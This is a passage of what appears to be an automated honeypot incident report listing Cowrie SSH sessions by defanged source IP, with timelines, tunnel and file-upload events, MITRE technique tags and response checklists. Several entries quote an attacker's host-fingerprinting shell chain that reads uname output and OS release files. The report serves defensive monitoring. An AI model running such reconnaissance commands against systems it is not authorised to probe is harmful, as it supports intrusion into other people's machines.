| **First Seen** | 2026-08-11 01:11 |
| **Last Seen** | 2026-08-11 01:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:11:15` | `cowrie.session.connect` |
| `2026-08-11 01:11:16` | `cowrie.client.version` |
| `2026-08-11 01:11:16` | `cowrie.client.kex` |
| `2026-08-11 01:11:18` | `cowrie.login.success` |
| `2026-08-11 01:11:18` | `cowrie.direct-tcpip.request` |
| `2026-08-11 01:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e49ea28c1f1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 01:22 |
| **Last Seen** | 2026-08-11 01:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:22:44` | `cowrie.session.connect` |
| `2026-08-11 01:22:44` | `cowrie.client.version` |
| `2026-08-11 01:22:44` | `cowrie.client.kex` |
| `2026-08-11 01:22:44` | `cowrie.login.success` |
| `2026-08-11 01:22:45` | `cowrie.session.params` |
| `2026-08-11 01:22:45` | `cowrie.command.input` |
| `2026-08-11 01:22:45` | `cowrie.command.input` |
| `2026-08-11 01:22:45` | `cowrie.command.input` |
| `2026-08-11 01:22:45` | `cowrie.command.input` |
| `2026-08-11 01:22:45` | `cowrie.command.input` |
| `2026-08-11 01:22:45` | `cowrie.command.success` |
| `2026-08-11 01:22:45` | `cowrie.command.input` |
| `2026-08-11 01:22:45` | `cowrie.command.input` |
| `2026-08-11 01:22:45` | `cowrie.command.input` |
| `2026-08-11 01:22:45` | `cowrie.command.input` |
| `2026-08-11 01:22:45` | `cowrie.log.closed` |
| `2026-08-11 01:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e2889c99c3b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-11 01:25 |
| **Last Seen** | 2026-08-11 01:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:25:47` | `cowrie.session.connect` |
| `2026-08-11 01:25:47` | `cowrie.client.version` |
| `2026-08-11 01:25:47` | `cowrie.client.kex` |
| `2026-08-11 01:25:48` | `cowrie.login.success` |
| `2026-08-11 01:25:48` | `cowrie.direct-tcpip.request` |
| `2026-08-11 01:25:48` | `cowrie.direct-tcpip.data` |
| `2026-08-11 01:25:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00d51af3eefb

| Field | Detail |
|---|---|
| **Source IP** | `122.170.99[.]195` |
| **First Seen** | 2026-08-11 01:27 |
| **Last Seen** | 2026-08-11 01:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:27:26` | `cowrie.session.connect` |
| `2026-08-11 01:27:27` | `cowrie.client.version` |
| `2026-08-11 01:27:27` | `cowrie.client.kex` |
| `2026-08-11 01:27:29` | `cowrie.login.success` |
| `2026-08-11 01:27:29` | `cowrie.direct-tcpip.request` |
| `2026-08-11 01:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.99[.]195` to AbuseIPDB if not already reported
- [ ] Block `122.170.99[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e62138a77e9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 01:29 |
| **Last Seen** | 2026-08-11 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:29:37` | `cowrie.session.connect` |
| `2026-08-11 01:29:37` | `cowrie.client.version` |
| `2026-08-11 01:29:37` | `cowrie.client.kex` |
| `2026-08-11 01:29:38` | `cowrie.login.success` |
| `2026-08-11 01:29:39` | `cowrie.session.params` |
| `2026-08-11 01:29:39` | `cowrie.command.input` |
| `2026-08-11 01:29:39` | `cowrie.command.input` |
| `2026-08-11 01:29:39` | `cowrie.command.input` |
| `2026-08-11 01:29:39` | `cowrie.command.input` |
| `2026-08-11 01:29:39` | `cowrie.command.input` |
| `2026-08-11 01:29:39` | `cowrie.command.success` |
| `2026-08-11 01:29:39` | `cowrie.command.input` |
| `2026-08-11 01:29:39` | `cowrie.command.input` |
| `2026-08-11 01:29:39` | `cowrie.command.input` |
| `2026-08-11 01:29:39` | `cowrie.command.input` |
| `2026-08-11 01:29:39` | `cowrie.log.closed` |
| `2026-08-11 01:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cabfa345fdb7

| Field | Detail |
|---|---|
| **Source IP** | `154.241.31[.]235` |
| **First Seen** | 2026-08-11 01:33 |
| **Last Seen** | 2026-08-11 01:35 |
| **Session Duration** | 88s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:33:51` | `cowrie.session.connect` |
| `2026-08-11 01:33:51` | `cowrie.client.version` |
| `2026-08-11 01:33:51` | `cowrie.client.kex` |
| `2026-08-11 01:33:52` | `cowrie.login.success` |
| `2026-08-11 01:35:19` | `cowrie.session.file_upload` |
| `2026-08-11 01:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.241.31[.]235` to AbuseIPDB if not already reported
- [ ] Block `154.241.31[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d80a29a3df4

| Field | Detail |
|---|---|
| **Source IP** | `117.247.239[.]202` |
| **First Seen** | 2026-08-11 01:37 |
| **Last Seen** | 2026-08-11 01:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:37:49` | `cowrie.session.connect` |
| `2026-08-11 01:37:49` | `cowrie.client.version` |
| `2026-08-11 01:37:49` | `cowrie.client.kex` |
| `2026-08-11 01:37:51` | `cowrie.login.success` |
| `2026-08-11 01:37:52` | `cowrie.direct-tcpip.request` |
| `2026-08-11 01:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.239[.]202` to AbuseIPDB if not already reported
- [ ] Block `117.247.239[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d76f8da9edbe

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 01:38 |
| **Last Seen** | 2026-08-11 01:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:38:26` | `cowrie.session.connect` |
| `2026-08-11 01:38:26` | `cowrie.client.version` |
| `2026-08-11 01:38:27` | `cowrie.client.kex` |
| `2026-08-11 01:38:27` | `cowrie.login.success` |
| `2026-08-11 01:38:28` | `cowrie.session.params` |
| `2026-08-11 01:38:28` | `cowrie.command.input` |
| `2026-08-11 01:38:28` | `cowrie.command.input` |
| `2026-08-11 01:38:28` | `cowrie.command.input` |
| `2026-08-11 01:38:28` | `cowrie.command.input` |
| `2026-08-11 01:38:28` | `cowrie.command.input` |
| `2026-08-11 01:38:28` | `cowrie.command.success` |
| `2026-08-11 01:38:28` | `cowrie.command.input` |
| `2026-08-11 01:38:28` | `cowrie.command.input` |
| `2026-08-11 01:38:28` | `cowrie.command.input` |
| `2026-08-11 01:38:28` | `cowrie.command.input` |
| `2026-08-11 01:38:28` | `cowrie.log.closed` |
| `2026-08-11 01:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b65c184dcda4

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]111` |
| **First Seen** | 2026-08-11 01:42 |
| **Last Seen** | 2026-08-11 01:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:42:57` | `cowrie.session.connect` |
| `2026-08-11 01:42:57` | `cowrie.client.version` |
| `2026-08-11 01:42:57` | `cowrie.client.kex` |
| `2026-08-11 01:42:58` | `cowrie.login.success` |
| `2026-08-11 01:42:59` | `cowrie.direct-tcpip.request` |
| `2026-08-11 01:43:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]111` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6eeea99b17

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-08-11 01:45 |
| **Last Seen** | 2026-08-11 01:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:45:21` | `cowrie.session.connect` |
| `2026-08-11 01:45:22` | `cowrie.client.version` |
| `2026-08-11 01:45:22` | `cowrie.client.kex` |
| `2026-08-11 01:45:24` | `cowrie.login.success` |
| `2026-08-11 01:45:24` | `cowrie.direct-tcpip.request` |
| `2026-08-11 01:45:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3edf8cf65795

| Field | Detail |
|---|---|
| **Source IP** | `59.46.182[.]10` |
| **First Seen** | 2026-08-11 01:45 |
| **Last Seen** | 2026-08-11 01:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:45:34` | `cowrie.session.connect` |
| `2026-08-11 01:45:36` | `cowrie.client.version` |
| `2026-08-11 01:45:36` | `cowrie.client.kex` |
| `2026-08-11 01:45:39` | `cowrie.login.success` |
| `2026-08-11 01:45:40` | `cowrie.direct-tcpip.request` |
| `2026-08-11 01:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.46.182[.]10` to AbuseIPDB if not already reported
- [ ] Block `59.46.182[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef0317d6f719

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 01:45 |
| **Last Seen** | 2026-08-11 01:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:45:41` | `cowrie.session.connect` |
| `2026-08-11 01:45:41` | `cowrie.client.version` |
| `2026-08-11 01:45:42` | `cowrie.client.kex` |
| `2026-08-11 01:45:42` | `cowrie.login.success` |
| `2026-08-11 01:45:43` | `cowrie.session.params` |
| `2026-08-11 01:45:43` | `cowrie.command.input` |
| `2026-08-11 01:45:43` | `cowrie.command.input` |
| `2026-08-11 01:45:43` | `cowrie.command.input` |
| `2026-08-11 01:45:43` | `cowrie.command.input` |
| `2026-08-11 01:45:43` | `cowrie.command.input` |
| `2026-08-11 01:45:43` | `cowrie.command.success` |
| `2026-08-11 01:45:43` | `cowrie.command.input` |
| `2026-08-11 01:45:43` | `cowrie.command.input` |
| `2026-08-11 01:45:43` | `cowrie.command.input` |
| `2026-08-11 01:45:43` | `cowrie.command.input` |
| `2026-08-11 01:45:44` | `cowrie.log.closed` |
| `2026-08-11 01:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4a5f7b7e896

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-11 01:55 |
| **Last Seen** | 2026-08-11 01:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:55:52` | `cowrie.session.connect` |
| `2026-08-11 01:55:52` | `cowrie.client.version` |
| `2026-08-11 01:55:52` | `cowrie.client.kex` |
| `2026-08-11 01:55:53` | `cowrie.login.success` |
| `2026-08-11 01:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf1903d9d8e8

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-11 01:55 |
| **Last Seen** | 2026-08-11 01:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:55:52` | `cowrie.session.connect` |
| `2026-08-11 01:55:52` | `cowrie.client.version` |
| `2026-08-11 01:55:52` | `cowrie.client.kex` |
| `2026-08-11 01:55:53` | `cowrie.login.success` |
| `2026-08-11 01:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7009d21b903

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-11 02:08 |
| **Last Seen** | 2026-08-11 02:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:08:42` | `cowrie.session.connect` |
| `2026-08-11 02:08:42` | `cowrie.client.version` |
| `2026-08-11 02:08:42` | `cowrie.client.kex` |
| `2026-08-11 02:08:43` | `cowrie.login.success` |
| `2026-08-11 02:08:43` | `cowrie.direct-tcpip.request` |
| `2026-08-11 02:08:43` | `cowrie.direct-tcpip.data` |
| `2026-08-11 02:08:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-466e7dcd6a3d

| Field | Detail |
|---|---|
| **Source IP** | `197.251.193[.]6` |
| **First Seen** | 2026-08-11 02:11 |
| **Last Seen** | 2026-08-11 02:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:11:44` | `cowrie.session.connect` |
| `2026-08-11 02:11:44` | `cowrie.client.version` |
| `2026-08-11 02:11:44` | `cowrie.client.kex` |
| `2026-08-11 02:11:46` | `cowrie.login.success` |
| `2026-08-11 02:11:46` | `cowrie.direct-tcpip.request` |
| `2026-08-11 02:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.251.193[.]6` to AbuseIPDB if not already reported
- [ ] Block `197.251.193[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5820b7d6a4f2

| Field | Detail |
|---|---|
| **Source IP** | `34.41.211[.]48` |
| **First Seen** | 2026-08-11 02:11 |
| **Last Seen** | 2026-08-11 02:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:11:51` | `cowrie.session.connect` |
| `2026-08-11 02:11:51` | `cowrie.client.version` |
| `2026-08-11 02:11:51` | `cowrie.client.kex` |
| `2026-08-11 02:11:52` | `cowrie.login.success` |
| `2026-08-11 02:11:53` | `cowrie.direct-tcpip.request` |
| `2026-08-11 02:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.41.211[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.41.211[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de4d4c340582

| Field | Detail |
|---|---|
| **Source IP** | `182.92.204[.]91` |
| **First Seen** | 2026-08-11 02:18 |
| **Last Seen** | 2026-08-11 02:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:18:28` | `cowrie.session.connect` |
| `2026-08-11 02:18:28` | `cowrie.client.version` |
| `2026-08-11 02:18:29` | `cowrie.client.kex` |
| `2026-08-11 02:18:30` | `cowrie.login.success` |
| `2026-08-11 02:18:31` | `cowrie.session.params` |
| `2026-08-11 02:18:31` | `cowrie.command.input` |
| `2026-08-11 02:18:32` | `cowrie.log.closed` |
| `2026-08-11 02:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.92.204[.]91` to AbuseIPDB if not already reported
- [ ] Block `182.92.204[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d28af8be7c6

| Field | Detail |
|---|---|
| **Source IP** | `213.55.79[.]195` |
| **First Seen** | 2026-08-11 02:35 |
| **Last Seen** | 2026-08-11 02:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:35:55` | `cowrie.session.connect` |
| `2026-08-11 02:35:56` | `cowrie.client.version` |
| `2026-08-11 02:35:56` | `cowrie.client.kex` |
| `2026-08-11 02:35:57` | `cowrie.login.success` |
| `2026-08-11 02:35:57` | `cowrie.direct-tcpip.request` |
| `2026-08-11 02:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.55.79[.]195` to AbuseIPDB if not already reported
- [ ] Block `213.55.79[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c31d0c23407a

| Field | Detail |
|---|---|
| **Source IP** | `185.221.21[.]17` |
| **First Seen** | 2026-08-11 02:37 |
| **Last Seen** | 2026-08-11 02:37 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:37:26` | `cowrie.session.connect` |
| `2026-08-11 02:37:26` | `cowrie.client.version` |
| `2026-08-11 02:37:26` | `cowrie.client.kex` |
| `2026-08-11 02:37:27` | `cowrie.login.success` |
| `2026-08-11 02:37:58` | `cowrie.session.file_upload` |
| `2026-08-11 02:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.221.21[.]17` to AbuseIPDB if not already reported
- [ ] Block `185.221.21[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5a9fb8385b8

| Field | Detail |
|---|---|
| **Source IP** | `130.211.76[.]1` |
| **First Seen** | 2026-08-11 02:49 |
| **Last Seen** | 2026-08-11 02:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:49:29` | `cowrie.session.connect` |
| `2026-08-11 02:49:29` | `cowrie.login.success` |
| `2026-08-11 02:49:30` | `cowrie.session.params` |
| `2026-08-11 02:49:30` | `cowrie.command.input` |
| `2026-08-11 02:49:30` | `cowrie.command.input` |
| `2026-08-11 02:49:30` | `cowrie.command.failed` |
| `2026-08-11 02:49:30` | `cowrie.command.input` |
| `2026-08-11 02:49:30` | `cowrie.log.closed` |
| `2026-08-11 02:49:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.76[.]1` to AbuseIPDB if not already reported
- [ ] Block `130.211.76[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-243732286739

| Field | Detail |
|---|---|
| **Source IP** | `130.211.76[.]1` |
| **First Seen** | 2026-08-11 02:49 |
| **Last Seen** | 2026-08-11 02:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 02:49:38` | `cowrie.session.connect` |
| `2026-08-11 02:49:38` | `cowrie.login.success` |
| `2026-08-11 02:49:39` | `cowrie.session.params` |
| `2026-08-11 02:49:39` | `cowrie.command.input` |
| `2026-08-11 02:49:39` | `cowrie.command.failed` |
| `2026-08-11 02:49:42` | `cowrie.log.closed` |
